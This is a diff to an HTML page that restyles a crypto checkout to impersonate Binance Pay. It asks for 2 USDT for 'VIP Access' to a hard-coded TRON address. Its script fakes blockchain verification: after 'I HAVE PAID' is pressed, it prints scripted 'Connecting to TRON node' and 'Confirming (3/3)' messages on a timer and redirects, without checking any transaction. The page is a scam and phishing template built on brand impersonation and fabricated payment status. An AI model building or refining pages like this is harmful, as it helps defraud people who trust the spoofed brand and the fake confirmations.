@@ -3,65 +3,58 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Secure Checkout</title>
+<title>Checkout</title>
 
 <style>
 body {
   margin:0;
-  font-family:'Segoe UI', sans-serif;
-  background:linear-gradient(135deg,#050505,#0a0a0a);
-  color:white;
+  font-family:'Segoe UI',sans-serif;
+  background:#0b0e11;
+  color:#eaecef;
+}
+
+.header {
+  padding:15px;
+  font-size:18px;
+  font-weight:bold;
+  border-bottom:1px solid #222;
 }
 
 .container {
   max-width:420px;
   margin:auto;
-  padding:20px;
+  padding:15px;
 }
 
 .card {
-  background:#0f0f0f;
-  padding:25px;
-  border-radius:18px;
-  text-align:center;
-  box-shadow:0 0 40px rgba(0,255,150,0.08);
-}
-
-h2 {
-  margin-bottom:5px;
-}
-
-.sub {
-  font-size:12px;
-  color:#aaa;
-  margin-bottom:15px;
-}
-
-.price-box {
-  background:#000;
-  padding:15px;
+  background:#1e2329;
+  padding:20px;
   border-radius:12px;
   margin-bottom:15px;
 }
 
+.label {
+  font-size:12px;
+  color:#848e9c;
+}
+
+.value {
+  font-size:14px;
+  margin-top:3px;
+}
+
 .amount {
-  font-size:26px;
-  color:#00ffa6;
+  font-size:24px;
+  color:#0ecb81;
   font-weight:bold;
 }
 
-.network {
-  font-size:12px;
-  color:#888;
-}
-
 .wallet {
-  background:#000;
-  padding:12px;
-  border-radius:10px;
+  background:#0b0e11;
+  padding:10px;
+  border-radius:8px;
   font-size:12px;
   word-break:break-all;
-  color:#00ffa6;
   margin-top:10px;
 }
 
@@ -69,34 +62,33 @@ button {
   width:100%;
   padding:14px;
   border:none;
-  border-radius:10px;
+  border-radius:8px;
   margin-top:10px;
-  font-size:15px;
-  cursor:pointer;
+  font-size:14px;
 }
 
 .copy {
-  background:#1a1a1a;
-  color:white;
+  background:#2b3139;
+  color:#fff;
 }
 
 .pay {
-  background:linear-gradient(135deg,#00ffa6,#00c853);
-  color:black;
+  background:#fcd535;
+  color:#000;
   font-weight:bold;
 }
 
 .timer {
+  text-align:center;
   margin-top:10px;
-  color:#ff5252;
-  font-size:14px;
+  color:#f6465d;
 }
 
 .progress {
-  height:6px;
-  background:#222;
+  height:5px;
+  background:#2b3139;
   border-radius:10px;
-  margin-top:15px;
+  margin-top:10px;
   overflow:hidden;
   display:none;
 }
@@ -104,108 +96,102 @@ button {
 .bar {
   height:100%;
   width:0%;
-  background:#00ffa6;
+  background:#0ecb81;
 }
 
 .logs {
-  margin-top:12px;
-  font-size:11px;
-  color:#00ffa6;
-  font-family:monospace;
-  min-height:60px;
-}
-
-.badge {
-  margin-top:12px;
+  margin-top:10px;
   font-size:12px;
-  color:#aaa;
+  color:#0ecb81;
+  font-family:monospace;
 }
 </style>
 </head>
 
 <body>
 
+<div class="header">Binance Pay</div>
+
 <div class="container">
+
   <div class="card">
+    <div class="label">Order</div>
+    <div class="value">VIP Access</div>
+  </div>
 
-    <h2>💳 Secure Checkout</h2>
-    <div class="sub">TRON Network • USDT (TRC20)</div>
+  <div class="card">
+    <div class="label">Amount</div>
+    <div class="amount">2 USDT</div>
 
-    <div class="price-box">
-      <div class="amount">2 USDT</div>
-      <div class="network">Send exact amount</div>
-    </div>
+    <div class="label" style="margin-top:10px;">Network</div>
+    <div class="value">TRON (TRC20)</div>
+  </div>
+
+  <div class="card">
+    <div class="label">Deposit Address</div>
 
     <div class="wallet" id="wallet">
       TVm4hobikFLNfu9aUMRVqvzA6TuVxJvqWf
     </div>
 
-    <button class="copy" onclick="copyWallet()">Copy Address</button>
-
-    <div class="timer" id="timer">05:00</div>
-
-    <button class="pay" onclick="startVerify()">I HAVE PAID</button>
-
-    <div class="progress" id="progress">
-      <div class="bar" id="bar"></div>
-    </div>
-
-    <div class="logs" id="logs"></div>
-
-    <div class="badge">
-      🔒 Secure blockchain payment<br>
-      ⚡ Verification required before access
-    </div>
-
+    <button class="copy" onclick="copy()">Copy Address</button>
   </div>
+
+  <div class="timer" id="timer">05:00</div>
+
+  <button class="pay" onclick="start()">I HAVE PAID</button>
+
+  <div class="progress" id="progress">
+    <div class="bar" id="bar"></div>
+  </div>
+
+  <div class="logs" id="logs"></div>
+
 </div>
 
 <script>
-let time = 300;
+let time=300;
 
 setInterval(()=>{
-  let m = Math.floor(time/60);
-  let s = time%60;
-  document.getElementById("timer").innerHTML =
-  m + ":" + (s<10?"0":"")+s;
+  let m=Math.floor(time/60);
+  let s=time%60;
+  document.getElementById("timer").innerHTML=
+  m+":"+(s<10?"0":"")+s;
   time--;
 },1000);
 
-function copyWallet(){
+function copy(){
   navigator.clipboard.writeText("TVm4hobikFLNfu9aUMRVqvzA6TuVxJvqWf");
   alert("Address copied");
 }
 
-function startVerify(){
-
-  let logs = document.getElementById("logs");
-  let bar = document.getElementById("bar");
-  let progress = document.getElementById("progress");
+function start(){
+  let logs=document.getElementById("logs");
+  let bar=document.getElementById("bar");
+  let progress=document.getElementById("progress");
 
   progress.style.display="block";
 
-  let steps = [
-    "Connecting to TRON network...",
-    "Scanning for transaction...",
-    "Awaiting confirmation...",
+  let steps=[
+    "Connecting to TRON node...",
+    "Detecting transaction...",
+    "Confirming (1/3)...",
+    "Confirming (2/3)...",
+    "Confirming (3/3)...",
     "Verification required"
   ];
 
   let i=0;
   let width=0;
 
-  let interval = setInterval(()=>{
-
-    logs.innerHTML += steps[i] + "<br>";
-
-    width += 20;
-    bar.style.width = width + "%";
-
+  let interval=setInterval(()=>{
+    logs.innerHTML+=steps[i]+"<br>";
+    width+=15;
+    bar.style.width=width+"%";
     i++;
 
-    if(i >= steps.length){
+    if(i>=steps.length){
       clearInterval(interval);
-
       setTimeout(()=>{
         window.location.href="vip.html";
       },1200);
